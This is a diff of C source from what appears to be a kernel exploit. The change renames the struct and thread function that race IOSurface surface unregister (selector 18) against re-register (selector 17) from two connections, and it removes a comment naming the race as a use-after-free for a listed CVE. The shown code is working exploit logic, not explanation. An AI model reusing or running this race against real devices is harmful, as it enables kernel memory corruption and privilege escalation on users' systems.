@@ -932,7 +932,6 @@ static void *race_thread_fn(void *arg) {
 static int g_main_argc;
 static char **g_main_argv;
 
-/* Race thread context for IOSurface UAF (CVE-2026-112477) */
 typedef struct {
     io_connect_t conn;
     uint32_t surface_id;
@@ -940,10 +939,10 @@ typedef struct {
     volatile int go;
     volatile int done;
     kern_return_t result;
-} race_ctx_t;
+} iosurface_race_ctx_t;
 
-static void *race_thread_fn(void *arg) {
-    race_ctx_t *ctx = (race_ctx_t *)arg;
+static void *iosurface_race_fn(void *arg) {
+    iosurface_race_ctx_t *ctx = (iosurface_race_ctx_t *)arg;
     while (!ctx->go) { /* spin */ }
     uint64_t input[1] = { ctx->surface_id };
     ctx->result = IOConnectCallMethod(ctx->conn, ctx->selector,
@@ -8262,14 +8261,14 @@ vps_cd_done:
             }
 
             /* Race: conn[1] unregisters (sel 18) while conn[0] re-registers (sel 17) */
-            race_ctx_t unreg_ctx = { .conn = conns[1], .surface_id = target_id,
+            iosurface_race_ctx_t unreg_ctx = { .conn = conns[1], .surface_id = target_id,
                                      .selector = 18, .go = 0, .done = 0 };
-            race_ctx_t rereg_ctx = { .conn = conns[0], .surface_id = target_id,
+            iosurface_race_ctx_t rereg_ctx = { .conn = conns[0], .surface_id = target_id,
                                      .selector = 17, .go = 0, .done = 0 };
 
             pthread_t t1, t2;
-            pthread_create(&t1, NULL, race_thread_fn, &unreg_ctx);
-            pthread_create(&t2, NULL, race_thread_fn, &rereg_ctx);
+            pthread_create(&t1, NULL, iosurface_race_fn, &unreg_ctx);
+            pthread_create(&t2, NULL, iosurface_race_fn, &rereg_ctx);
 
             /* Tiny stagger then fire */
             usleep(arc4random_uniform(50));
